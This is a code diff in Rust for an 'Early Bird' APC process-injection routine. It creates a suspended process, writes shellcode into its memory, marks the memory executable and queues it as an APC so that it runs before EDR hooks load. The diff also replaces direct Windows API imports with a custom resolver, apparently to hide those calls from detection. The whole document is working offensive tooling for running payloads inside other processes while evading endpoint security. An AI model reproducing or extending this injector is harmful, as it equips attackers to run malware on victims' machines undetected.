@@ -8,16 +8,45 @@ pub fn live_inject(
     log: &LogSink,
 ) -> Result<InjectionResult, String> {
     use super::wrappers::wrap_for_apc;
-    use windows::Win32::Foundation::CloseHandle;
-    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
-    use windows::Win32::System::Memory::{
-        VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
-        PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-    };
-    use windows::Win32::System::Threading::{
-        CreateProcessW, QueueUserAPC, ResumeThread, TerminateProcess, CREATE_SUSPENDED,
-        PROCESS_INFORMATION, STARTUPINFOW,
-    };
+    use crate::resolve;
+    use std::ffi::c_void;
+
+    const CREATE_SUSPENDED: u32 = 0x00000004;
+    const MEM_COMMIT: u32 = 0x1000;
+    const MEM_RESERVE: u32 = 0x2000;
+    const MEM_RELEASE: u32 = 0x8000;
+    const PAGE_READWRITE: u32 = 0x04;
+    const PAGE_EXECUTE_READ: u32 = 0x20;
+
+    #[repr(C)]
+    struct STARTUPINFOW {
+        cb: u32,
+        _reserved: *mut u16,
+        _desktop: *mut u16,
+        _title: *mut u16,
+        _x: u32,
+        _y: u32,
+        _x_size: u32,
+        _y_size: u32,
+        _x_count_chars: u32,
+        _y_count_chars: u32,
+        _fill_attribute: u32,
+        dw_flags: u32,
+        w_show_window: u16,
+        _cb_reserved2: u16,
+        _lp_reserved2: *mut u8,
+        h_std_input: *mut c_void,
+        h_std_output: *mut c_void,
+        h_std_error: *mut c_void,
+    }
+
+    #[repr(C)]
+    struct PROCESS_INFORMATION {
+        h_process: *mut c_void,
+        h_thread: *mut c_void,
+        dw_process_id: u32,
+        dw_thread_id: u32,
+    }
 
     let wrapped = wrap_for_apc(shellcode);
     let size = wrapped.len();
@@ -35,39 +64,39 @@ pub fn live_inject(
     let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
 
     let created = unsafe {
-        CreateProcessW(
-            None,
-            windows::core::PWSTR(target_wide.as_mut_ptr()),
-            None,
-            None,
-            false,
+        resolve::CreateProcessW(
+            std::ptr::null(),
+            target_wide.as_mut_ptr(),
+            std::ptr::null(),
+            std::ptr::null(),
+            0,
             CREATE_SUSPENDED,
-            None,
-            None,
-            &si,
-            &mut pi,
+            std::ptr::null(),
+            std::ptr::null(),
+            &si as *const _ as *const c_void,
+            &mut pi as *mut _ as *mut c_void,
         )
     };
-    if let Err(e) = created {
+    if created == 0 {
         return Err(format!(
-            "CreateProcessW failed: {e} — check that \"{}\" exists and is executable",
+            "CreateProcessW failed — check that \"{}\" exists and is executable",
             target_exe
         ));
     }
     log.info(format!(
         "      spawned suspended process PID {} (main thread TID {})",
-        pi.dwProcessId, pi.dwThreadId
+        pi.dw_process_id, pi.dw_thread_id
     ));
 
-    let process = pi.hProcess;
-    let thread = pi.hThread;
+    let process = pi.h_process;
+    let thread = pi.h_thread;
 
     let cleanup_kill = |log: &LogSink| {
         log.detail("[cleanup] TerminateProcess — killing spawned process");
         unsafe {
-            let _ = TerminateProcess(process, 1);
-            let _ = CloseHandle(thread);
-            let _ = CloseHandle(process);
+            resolve::TerminateProcess(process, 1);
+            resolve::CloseHandle(thread);
+            resolve::CloseHandle(process);
         }
     };
 
@@ -76,9 +105,9 @@ pub fn live_inject(
         size
     ));
     let base = unsafe {
-        VirtualAllocEx(
+        resolve::VirtualAllocEx(
             process,
-            None,
+            std::ptr::null(),
             size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
@@ -95,62 +124,56 @@ pub fn live_inject(
 
     log.step(format!("[3/6] WriteProcessMemory — {} bytes", size));
     let mut written: usize = 0;
-    if let Err(e) = unsafe {
-        WriteProcessMemory(
+    let ok = unsafe {
+        resolve::WriteProcessMemory(
             process,
-            base as *const core::ffi::c_void,
-            wrapped.as_ptr() as *const core::ffi::c_void,
+            base as *const c_void,
+            wrapped.as_ptr() as *const c_void,
             size,
-            Some(&mut written),
+            &mut written,
         )
-    } {
-        unsafe {
-            let _ = VirtualFreeEx(process, base, 0, MEM_RELEASE);
-        }
+    };
+    if ok == 0 {
+        unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
         cleanup_kill(log);
-        return Err(format!("WriteProcessMemory failed: {e}"));
+        return Err("WriteProcessMemory failed".to_string());
     }
     log.info(format!("      wrote {} bytes", written));
 
     log.step("[4/6] VirtualProtectEx — PAGE_READWRITE -> PAGE_EXECUTE_READ");
-    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-    if let Err(e) = unsafe {
-        VirtualProtectEx(
+    let mut old_protect: u32 = 0;
+    let ok = unsafe {
+        resolve::VirtualProtectEx(
             process,
-            base as *const core::ffi::c_void,
+            base as *const c_void,
             size,
             PAGE_EXECUTE_READ,
             &mut old_protect,
         )
-    } {
-        unsafe {
-            let _ = VirtualFreeEx(process, base, 0, MEM_RELEASE);
-        }
+    };
+    if ok == 0 {
+        unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
         cleanup_kill(log);
-        return Err(format!("VirtualProtectEx failed: {e}"));
+        return Err("VirtualProtectEx failed".to_string());
     }
     log.info(format!(
         "      remote page is now PAGE_EXECUTE_READ (previous protection: {:#x})",
-        old_protect.0
+        old_protect
     ));
 
     log.step("[5/6] QueueUserAPC — queuing to suspended main thread");
-    let apc_func = Some(unsafe {
-        core::mem::transmute::<*mut core::ffi::c_void, unsafe extern "system" fn(usize)>(base)
-    });
-    if unsafe { QueueUserAPC(apc_func, thread, 0) } == 0 {
-        unsafe {
-            let _ = VirtualFreeEx(process, base, 0, MEM_RELEASE);
-        }
+    let apc_func = base as *const c_void;
+    if unsafe { resolve::QueueUserAPC(apc_func, thread, 0) } == 0 {
+        unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
         cleanup_kill(log);
         return Err("QueueUserAPC failed on suspended main thread".to_string());
     }
     log.info("      APC queued to main thread");
 
     log.step("[6/6] ResumeThread — thread initializes, APC fires before EDR hooks install");
-    let _ = unsafe { ResumeThread(thread) };
-    let _ = unsafe { CloseHandle(thread) };
-    let _ = unsafe { CloseHandle(process) };
+    unsafe { resolve::ResumeThread(thread) };
+    unsafe { resolve::CloseHandle(thread) };
+    unsafe { resolve::CloseHandle(process) };
 
     log.info("      main thread resumed — APC fires during process init");
     log.warning("      shellcode runs BEFORE EDR user-mode hooks are established");
